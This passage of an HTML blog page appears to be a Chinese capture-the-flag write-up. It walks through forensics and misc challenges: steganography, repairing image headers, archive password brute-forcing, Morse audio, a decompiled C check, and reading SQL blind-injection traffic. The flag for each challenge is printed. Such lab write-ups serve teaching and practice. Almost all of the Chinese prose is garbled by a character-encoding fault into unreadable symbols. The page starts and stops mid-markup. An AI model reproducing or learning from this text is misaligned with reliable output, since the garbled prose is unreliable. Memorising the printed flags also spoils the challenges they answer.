class="line">ä½›æ›°ï¼šé®ç­‰è«³å‹èƒ½ç¤™çš¤è—å“†å¨‘æ¢µè¿¦ä¾„ç¾…å“†è¿¦æ¢µè€…æ¢µæ¥è˜‡æ¶…ä¾„å®¤å¯¦çœŸç¼½æœ‹èƒ½ã€‚å¥¢æ€›ä¿±é“æ€¯éƒ½è«³æ€–æ¢µå°¼æ€¯ä¸€ç½°å¿ƒç¼½è¬¹ç¼½è–©è‹¦å¥¢å¤¢æ€¯å¸æ¢µé æœ‹é™€è«³é™€ç©†è«³æ‰€å‘çŸ¥æ¶…ä¾„ä»¥è–©æ€¯æƒ³å¤·å¥¢é†¯æ•¸ç¾…æ€¯è«¸</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ä¸ä½›è®ºç¦…ç¨‹åºè§£å¯†å¯å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;w0_fo_ci_Be1&#125;</span><br></pre></td></tr></table></figure><h3 id="ç§˜å¯†æ–‡ä»¶"><a href="#ç§˜å¯†æ–‡ä»¶" class="headerlink" title="ç§˜å¯†æ–‡ä»¶"></a>ç§˜å¯†æ–‡ä»¶</h3><p>ä¸è¢«å·èµ°çš„æ–‡ä»¶ä¸€è‡´ï¼ŒWireshark åˆ†ææµé‡åŒ…è·Ÿè¸ª TCP æµï¼Œå¯ä»¥å‘ç°ä¸€ä¸ªå‹ç¼©æ–‡æ¡£ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213887199430/43fa75243a53d80de63e06268600b59c62afb9ea.png"></p><p>å°†å…¶ä¿å­˜ä¸‹æ¥ç„¶åä½¿ç”¨ ARCHPR çˆ†ç ´å¾—å‡ºè§£å‹å¯†ç ä¸º 1903ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213887291132/1d9bb41a06ba87a7616a78f927d08828210d2e6e.png"></p><p>è§£å‹æ–‡ä»¶å³å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;6fe99a5d03fb01f833ec3caa80358fa3&#125;</span><br></pre></td></tr></table></figure><h3 id="BJDCTF2020-ä½ çŒœæˆ‘æ˜¯ä¸ªå•¥"><a href="#BJDCTF2020-ä½ çŒœæˆ‘æ˜¯ä¸ªå•¥" class="headerlink" title="[BJDCTF2020]ä½ çŒœæˆ‘æ˜¯ä¸ªå•¥"></a>[BJDCTF2020]ä½ çŒœæˆ‘æ˜¯ä¸ªå•¥</h3><p>010 editor æ‰“å¼€æ–‡ä»¶ï¼Œåœ¨æ–‡ä»¶å°¾éƒ¨å¯å‘ç° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;i_am_fl@g&#125;</span><br></pre></td></tr></table></figure><h3 id="SWPU2019-ç¥å¥‡çš„äºŒç»´ç "><a href="#SWPU2019-ç¥å¥‡çš„äºŒç»´ç " class="headerlink" title="[SWPU2019]ç¥å¥‡çš„äºŒç»´ç "></a>[SWPU2019]ç¥å¥‡çš„äºŒç»´ç </h3><p>binwalk å¯ä»¥å‘ç°è§£å‹å‡ºæ¥çš„å›¾ç‰‡ä¸­å­˜åœ¨å››ä¸ªå‹ç¼©æ–‡æ¡£ï¼Œ<code>binwalk -e</code> åˆ†ç¦»å‡ºæ¥ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213887391117/52f5442a41a02922905703ad2c8fe38f71d6c702.png"></p><p>é™¤å¼€æ‰¾åˆ°çš„å½©è›‹ï¼Œæœ‰ç”¨çš„ä¿¡æ¯åœ¨ä¸€ä¸ª Word æ–‡æ¡£ä¸­ï¼Œå¥—å¨ƒ base64 è§£ç ä¹‹åå¾—åˆ° <code>comEON_YOuAreSOSoS0great</code>ã€‚å°†è¿™ä¸²å­—ç¬¦ä¸²ä½œä¸ºå‹ç¼©åŒ…å¯†ç è§£å‹å‡ºéŸ³é¢‘ã€‚å¾ˆå®¹æ˜“åˆ†è¾¨å‡ºéŸ³é¢‘æ˜¯æ‘©æ–¯ç”µç ï¼Œä½¿ç”¨ CwGet æ¥æ”¶å¯å¾—æ–‡æœ¬ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213887480959/711d4e5a9f83f8f8b4640204290e7d72d169f61f.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;morseisveryveryeasy&#125;</span><br></pre></td></tr></table></figure><h3 id="BJDCTF2020-ä¸€å¶éšœç›®"><a href="#BJDCTF2020-ä¸€å¶éšœç›®" class="headerlink" title="[BJDCTF2020]ä¸€å¶éšœç›®"></a>[BJDCTF2020]ä¸€å¶éšœç›®</h3><p>PNG æ–‡ä»¶ CRC32 æ ¡éªŒå¤±è´¥ï¼ŒåŠ ä¹‹ StegSolve æ— è§£ï¼Œäºæ˜¯çŒœæµ‹å›¾ç‰‡å®½é«˜ä¸å¯¹ã€‚ä½¿ç”¨è„šæœ¬è®¡ç®—å‡ºå®½é«˜ <code>(&#39;hex:&#39;, &#39;0x141&#39;, &#39;0x34c&#39;)</code> å¹¶ä¿®æ­£ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213887740791/99b61980fdd9a73437e2fa25fa9c99d38cb3adbc.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xaflag&#123;66666&#125;</span><br></pre></td></tr></table></figure><h3 id="ç©¿è¶Šæ—¶ç©ºçš„æ€å¿µ"><a href="#ç©¿è¶Šæ—¶ç©ºçš„æ€å¿µ" class="headerlink" title="ç©¿è¶Šæ—¶ç©ºçš„æ€å¿µ"></a>ç©¿è¶Šæ—¶ç©ºçš„æ€å¿µ</h3><p>å°†éŸ³é¢‘æ–‡ä»¶å¯¼å…¥ Auditionï¼Œå¯å‘ç°å³å£°é“å­˜åœ¨æ‘©æ–¯ç”µç ï¼Œä½¿ç”¨ CwGet æ¥æ”¶å¯å¾—æ–‡æœ¬ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213887938632/d5c8a5760ebe3383608743fa31e91ba7f2e40465.png"></p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213888054470/195b3899708f33a375f08b788026f762d6d8da71.png"></p><p>å»é™¤æ‰é‡å¤éƒ¨åˆ†å¹¶æ‹¼æ¥å¯å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;f029bd6f551139eedeb8e45a175b0786&#125;</span><br></pre></td></tr></table></figure><h3 id="BJDCTF2020-é¸¡ä½ å¤ªç¾"><a href="#BJDCTF2020-é¸¡ä½ å¤ªç¾" class="headerlink" title="[BJDCTF2020]é¸¡ä½ å¤ªç¾"></a>[BJDCTF2020]é¸¡ä½ å¤ªç¾</h3><p>è§£å‹å¾—åˆ°ä¸¤ä¸ª gif æ–‡ä»¶ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªæ— æ³•æ‰“å¼€ã€‚ä½¿ç”¨ 010 editor æ‰“å¼€ï¼Œçœ‹åˆ°å¼€å¤´ä¸º 9a ä¸¤ä¸ªå­—ç¬¦ï¼ŒçŒœæµ‹æ˜¯ GIF å¤´ä¸å®Œæ•´ï¼Œè¡¥å…¨ä¸º GIF89a åå¯ä»¥æˆåŠŸæ‰“å¼€å¹¶çœ‹åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213888294288/80c5911e71b58e7c06b0eb32231348ab3b3e09a8.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;zhi_yin_you_are_beautiful&#125;</span><br></pre></td></tr></table></figure><h3 id="BJDCTF2020-just-a-rar"><a href="#BJDCTF2020-just-a-rar" class="headerlink" title="[BJDCTF2020]just_a_rar"></a>[BJDCTF2020]just_a_rar</h3><p>è§£å‹ä¹‹åå¾—åˆ°ä¸€ä¸ªå‹ç¼©æ–‡æ¡£ï¼Œæ ¹æ®å‹ç¼©æ–‡æ¡£åç§°æç¤ºï¼Œä½¿ç”¨ ARCHPR çˆ†ç ´å¾—åˆ°å¯†ç  2016ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213888395076/34712e52aa5a1240122f7e3ab0a8c49f9e4e07f4.png"></p><p>è§£å‹å¾—åˆ°ä¸€å¼  jpg å›¾ç‰‡ï¼Œä½¿ç”¨ 010 editor æ‰“å¼€å¯åœ¨æ–‡ä»¶ä¸­éƒ¨æ‰¾åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213888517475/119ec1d97bde7645ee8188af2a80e83783de509c.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Wadf_123&#125;</span><br></pre></td></tr></table></figure><h3 id="GKCTF2020-PokeÌmon"><a href="#GKCTF2020-PokeÌmon" class="headerlink" title="[GKCTF2020]PokeÌmon"></a>[GKCTF2020]PokeÌmon</h3><p>ä¸‹è½½ä¸ª VisualBoyAdvance-M å¹¶è½½å…¥æ¸¸æˆï¼Œæ ¹æ®å‰§æƒ…å’Œæç¤ºèµ°åˆ° 103 å·è·¯å°±èƒ½çœ‹åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213888730452/7a977dbfa27c3572c3700ef4879f4edcc0526ddf.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;PokEmon_14_CutE&#125;</span><br></pre></td></tr></table></figure><h3 id="ACTFæ–°ç”Ÿèµ›2020-outguess"><a href="#ACTFæ–°ç”Ÿèµ›2020-outguess" class="headerlink" title="[ACTFæ–°ç”Ÿèµ›2020]outguess"></a>[ACTFæ–°ç”Ÿèµ›2020]outguess</h3><p>è§£å‹å‡ºæ¥éå¸¸å¤šå¥‡æ€ªæ–‡ä»¶ï¼Œä¸è¿‡æ ¹æ®é¢˜ç›®åç§°ï¼Œåº”è¯¥æ˜¯ outguess éšå†™ï¼Œæ‰€ä»¥è¦æ‰¾ä¸€ä¸‹ keyã€‚åœ¨å›¾ç‰‡çš„å±æ€§ä¸­æ‰¾åˆ°ä¸€ä¸²ç¤¾ä¼šä¸»ä¹‰æ ¸å¿ƒä»·å€¼è§‚ï¼Œè§£å¯†ä¸€ä¸‹å¯ä»¥å¾—åˆ° abcï¼Œå› æ­¤ abc æ˜¯ keyã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213888820241/e467a85034de66620e8eeec563a082db308d875a.png"></p><p>å°† abc ä½œä¸ºå¯†é’¥å¯¹å›¾ç‰‡æ‰§è¡Œ outguess è§£å¯†æ“ä½œå³å¯å¾—åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213888963913/5274813fcba7290b3cb8454dcf422522407c1122.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ACTF&#123;gue33_Gu3Ss!2020&#125;</span><br></pre></td></tr></table></figure><h3 id="BJDCTF2020-çº³å°¼"><a href="#BJDCTF2020-çº³å°¼" class="headerlink" title="[BJDCTF2020]çº³å°¼"></a>[BJDCTF2020]çº³å°¼</h3><p>010 editor æ‰“å¼€è§£å‹å‡ºæ¥çš„ GIF å›¾ç‰‡ï¼Œæ ¹æ®æ–‡æœ¬æ–‡æ¡£æç¤ºå¯çŸ¥éœ€è¦è¡¥å…¨ GIF æ–‡ä»¶å¤´ï¼Œäºæ˜¯æ’å…¥ GIF8 è¡¥å…¨æ–‡ä»¶å¤´ã€‚ç”¨ PS æ‰“å¼€é€å¸§å¯¼å‡ºå¯ä»¥å¾—åˆ°ä¸€ä¸²å­—ç¬¦ä¸²ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213889058234/19200e91f4cfb0fe51b48e0fb101b2e2bd220ecd.png"><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213889155913/ea27774e53f86a7ef013d59e7b21f45de589fd35.png"><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213889248644/1c97de3e883f24ee492dba1bcaf03de12f41613d.png"></p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213889332362/f6334fc5cbb7484451a019aa57ebb4658565dc45.png"></p><p>å¾—åˆ°å­—ç¬¦ä¸²ä¸º <code>Q1RGe3dhbmdfYmFvX3FpYW5nX2lzX3NhZH0=</code>ï¼Œbase64 è§£ç åå¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF&#123;wang_bao_qiang_is_sad&#125;</span><br></pre></td></tr></table></figure><h3 id="SWPU2019-æˆ‘æœ‰ä¸€åªé©¬é‡Œå¥¥"><a href="#SWPU2019-æˆ‘æœ‰ä¸€åªé©¬é‡Œå¥¥" class="headerlink" title="[SWPU2019]æˆ‘æœ‰ä¸€åªé©¬é‡Œå¥¥"></a>[SWPU2019]æˆ‘æœ‰ä¸€åªé©¬é‡Œå¥¥</h3><p>è¿è¡Œä¸€æ¬¡å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¯ä»¥å¾—åˆ°æç¤ºã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ntfs      </span><br><span class="line">flag.txt</span><br></pre></td></tr></table></figure><p>äºæ˜¯å°è¯•ä½¿ç”¨ NTFS Stream Editor åˆ†æï¼Œå¯ä»¥å‘ç°è¾“å‡ºçš„æ–‡æœ¬æ–‡æ¡£ä¸­åŒ…å«é™„åŠ æ•°æ®ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213889486230/0d5784774e82f538a32d01e90679cc4550e443ee.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">swupctf&#123;ddg_is_cute&#125;</span><br></pre></td></tr></table></figure><h3 id="è°èµ¢äº†æ¯”èµ›ï¼Ÿ"><a href="#è°èµ¢äº†æ¯”èµ›ï¼Ÿ" class="headerlink" title="è°èµ¢äº†æ¯”èµ›ï¼Ÿ"></a>è°èµ¢äº†æ¯”èµ›ï¼Ÿ</h3><p>010 editor æ‰“å¼€æ–‡ä»¶ï¼Œå‘ç°å…¶å°¾éƒ¨æœ‰å‹ç¼©æ–‡æ¡£ã€‚<code>binwalk -e</code> åˆ†ç¦»å‡ºæ¥ï¼Œä½¿ç”¨ ARCHPR çˆ†ç ´å¾—åˆ°å¯†ç  1020ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213889579589/5ef9476a708b04a5236c36de9805d37c21ad735e.png"></p><p>å¾—åˆ°ä¸€å¼  GIF å›¾ç‰‡ï¼Œä½¿ç”¨ PS æ‰“å¼€ï¼Œåœ¨å›¾å±‚ 310 å¤„å¯ä»¥çœ‹è§ hint <code>do_you_know_where_is_flag</code>ã€‚å°†å›¾å±‚å¯¼å‡ºï¼Œä½¿ç”¨ StegSolve è§£éšå†™ï¼Œå¯ä»¥å¾—åˆ°ä¸€ä¸ªäºŒç»´ç ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213889684480/56b82919bec2b70973938d831ca4e95777a01827.png"></p><p>æ‰«æå³å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;shanxiajingwu_won_the_game&#125;</span><br></pre></td></tr></table></figure><h3 id="Mysterious"><a href="#Mysterious" class="headerlink" title="Mysterious"></a>Mysterious</h3><p>ç”¨ IDA æ‰“å¼€åˆ†æç¨‹åºï¼Œæ ¹æ®å­—ç¬¦ä¸² well done å¯ä»¥æ‰¾åˆ°å­ç¨‹åº sub_401090ã€‚å°†å…¶åç¼–è¯‘å¾—åˆ°ä»¥ä¸‹ä»£ç ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __stdcall <span class="title">sub_401090</span><span class="params">(HWND hWnd, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> Source; <span class="comment">// [esp+50h] [ebp-310h]</span></span><br><span class="line">  CHAR Text[<span class="number">4</span>]; <span class="comment">// [esp+154h] [ebp-20Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [esp+159h] [ebp-207h]</span></span><br><span class="line">  __int16 v9; <span class="comment">// [esp+255h] [ebp-10Bh]</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// [esp+257h] [ebp-109h]</span></span><br><span class="line">  <span class="keyword">int</span> Value; <span class="comment">// [esp+258h] [ebp-108h]</span></span><br><span class="line">  CHAR String; <span class="comment">// [esp+25Ch] [ebp-104h]</span></span><br><span class="line">  <span class="keyword">char</span> v13; <span class="comment">// [esp+25Fh] [ebp-101h]</span></span><br><span class="line">  <span class="keyword">char</span> v14; <span class="comment">// [esp+260h] [ebp-100h]</span></span><br><span class="line">  <span class="keyword">char</span> v15; <span class="comment">// [esp+261h] [ebp-FFh]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;String, <span class="number">0</span>, <span class="number">0x104</span>u);</span><br><span class="line">  Value = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">16</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">DestroyWindow</span>(hWnd);</span><br><span class="line">    <span class="built_in">PostQuitMessage</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( a2 == <span class="number">273</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a3 == <span class="number">1000</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">GetDlgItemTextA</span>(hWnd, <span class="number">1002</span>, &amp;String, <span class="number">260</span>);</span><br><span class="line">      <span class="built_in">strlen</span>(&amp;String);</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strlen</span>(&amp;String) &gt; <span class="number">6</span> )</span><br><span class="line">        <span class="built_in">ExitProcess</span>(<span class="number">0</span>);</span><br><span class="line">      v4 = <span class="built_in">atoi</span>(&amp;String);</span><br><span class="line">      Value = v4 + <span class="number">1</span>;  <span class="comment">//Value should be 122 + 1 == 123</span></span><br><span class="line">      <span class="keyword">if</span> ( v4 == <span class="number">122</span> &amp;&amp; v13 == <span class="number">120</span> &amp;&amp; v15 == <span class="number">122</span> &amp;&amp; v14 == <span class="number">121</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(Text, <span class="string">&quot;flag&quot;</span>);</span><br><span class="line">        <span class="built_in">memset</span>(&amp;v8, <span class="number">0</span>, <span class="number">0xFC</span>u);</span><br><span class="line">        v9 = <span class="number">0</span>;</span><br><span class="line">        v10 = <span class="number">0</span>;</span><br><span class="line">        _itoa(Value, &amp;Source, <span class="number">10</span>);</span><br><span class="line">        <span class="built_in">strcat</span>(Text, <span class="string">&quot;&#123;&quot;</span>);</span><br><span class="line">        <span class="built_in">strcat</span>(Text, &amp;Source); <span class="comment">//123</span></span><br><span class="line">        <span class="built_in">strcat</span>(Text, <span class="string">&quot;_&quot;</span>);</span><br><span class="line">        <span class="built_in">strcat</span>(Text, <span class="string">&quot;Buff3r_0v3rf|0w&quot;</span>);</span><br><span class="line">        <span class="built_in">strcat</span>(Text, <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">        <span class="built_in">MessageBoxA</span>(<span class="number">0</span>, Text, <span class="string">&quot;well done&quot;</span>, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">SetTimer</span>(hWnd, <span class="number">1u</span>, <span class="number">0x3E8</span>u, TimerFunc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( a3 == <span class="number">1001</span> )</span><br><span class="line">      <span class="built_in">KillTimer</span>(hWnd, <span class="number">1u</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”± <code>Value = v4 + 1</code> å’Œåˆ¤æ–­ä¸­çš„ <code>v4 == 122</code> å¯çŸ¥ Value åœ¨æ»¡è¶³èµ°ä¸‹å»çš„æ¡ä»¶æ—¶åº”ä¸º 123ï¼Œå°†ä¸‹æ–‡çš„å­—ç¬¦ä¸²æ‹¼æ¥èµ·æ¥å³å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;123_Buff3r_0v3rf|0w&#125;</span><br></pre></td></tr></table></figure><h3 id="sqltest"><a href="#sqltest" class="headerlink" title="sqltest"></a>sqltest</h3><p>Wireshark åˆ†ææµé‡åŒ…ç­›é€‰ http æ¡ç›®å¯çŸ¥æ˜¯ SQL ç›²æ³¨çš„æµé‡åŒ…ï¼Œflag é•¿åº¦ä¸º 38ã€‚æŒ‰ç…§ç›²æ³¨çš„é€»è¾‘è®°å½•ä¸‹è¿”å›å€¼ä¸ºçœŸçš„ ASCII æ•°å€¼ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">102 108 97 103 123 52 55 101 100 98 56 51 48 48 101 100 53 102 57 98 50 56 102 99 53 52 98 48 100 48 57 101 99 100 101 102 55 125</span><br></pre></td></tr></table></figure><p>å°†å…¶è½¬ä¸ºå­—ç¬¦ä¸²å¯å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;47edb8300ed5f9b28fc54b0d09ecdef7&#125;</span><br></pre></td></tr></table></figure><h3 id="GXYCTF2019-gakki"><a href="#GXYCTF2019-gakki" class="headerlink" title="[GXYCTF2019]gakki"></a>[GXYCTF2019]gakki</h3><p>010 editor æ‰“å¼€æ–‡ä»¶ï¼Œå‘ç°å…¶å°¾éƒ¨æœ‰å‹ç¼©æ–‡æ¡£ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213889784850/bd0beb4dc6d14daa983e00121919f5b0848e9982.png"></p><p><code>binwalk -e</code> åˆ†ç¦»å‡ºæ¥ï¼Œä½¿ç”¨ ARCHPR çˆ†ç ´å¾—åˆ°å¯†ç  8864ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213889873826/93ea6e9c10deb82692e4aff6bc08ddc6aeb0cbf7.png"></p><p>è§£å‹åå¾—åˆ°çœ‹ä¸æ‡‚çš„æ–‡æœ¬æ–‡æ¡£ï¼Œç»Ÿè®¡æ–‡æœ¬å­—ç¬¦å¯å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GXY&#123;gaki_IsMyw1fe&#125;</span><br></pre></td></tr></table></figure><h3 id="BJDCTF-2nd-TARGZ-y1ng"><a href="#BJDCTF-2nd-TARGZ-y1ng" class="headerlink" title="[BJDCTF 2nd]TARGZ-y1ng"></a>[BJDCTF 2nd]TARGZ-y1ng</h3><p>å¥—å¨ƒè§£å‹å‹ç¼©åŒ…ï¼Œå‹ç¼©åŒ…çš„åç§°æ˜¯ä¸‹ä¸€ä¸ªå‹ç¼©åŒ…çš„è§£å‹å¯†ç ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Unzip</span>(<span class="params">fileName</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        password = fileName.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">zip</span> = zipfile.ZipFile(fileName,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        <span class="built_in">zip</span>.extractall(pwd=password.encode(<span class="string">&quot;UTF-8&quot;</span>))</span><br><span class="line">        fileName = <span class="built_in">zip</span>.namelist()[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">zip</span>.close()</span><br><span class="line">Unzip(<span class="string">&quot;hW1ES89jF.tar.gz&quot;</span>)</span><br></pre></td></tr></table></figure><p>è§£å‹åˆ°æœ€åå³å¯å¾—åˆ° flag æ–‡ä»¶ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;wow_you_can_rea11y_dance&#125;</span><br></pre></td></tr></table></figure><h3 id="HBNIS2018-excelç ´è§£"><a href="#HBNIS2018-excelç ´è§£" class="headerlink" title="[HBNIS2018]excelç ´è§£"></a>[HBNIS2018]excelç ´è§£</h3><p>010 editor æ‰“å¼€æ–‡ä»¶ï¼Œå¯ä»¥ç›´æ¥æ‰¾åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213889966483/58a3f53a3a7ff4b7feb4393ed2162f06bd1a8089.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF&#123;office_easy_cracked&#125;</span><br></pre></td></tr></table></figure><h3 id="å–µå–µå–µ"><a href="#å–µå–µå–µ" class="headerlink" title="å–µå–µå–µ"></a>å–µå–µå–µ</h3><p>ä½¿ç”¨ StegSolve å¯è§£å‡ºä¸€å¼ å›¾ç‰‡ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213890138538/fbf0f63ef038b93039151be9ed2be36f62bb235c.png"></p><p>ä¿å­˜ä¸‹æ¥ä¿®æ­£å›¾ç‰‡æ–‡ä»¶å¤´å¹¶å¤§è‡´ä¿®æ­£å›¾ç‰‡é«˜åº¦åå¯å¾—ä¸€äºŒç»´ç ï¼Œå¯å°†å…¶åè‰²ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213890239129/85f13238f89d0b3c107a54304a2f5be0b3b9f5c0.png"></p><p>æ‰«æäºŒç»´ç 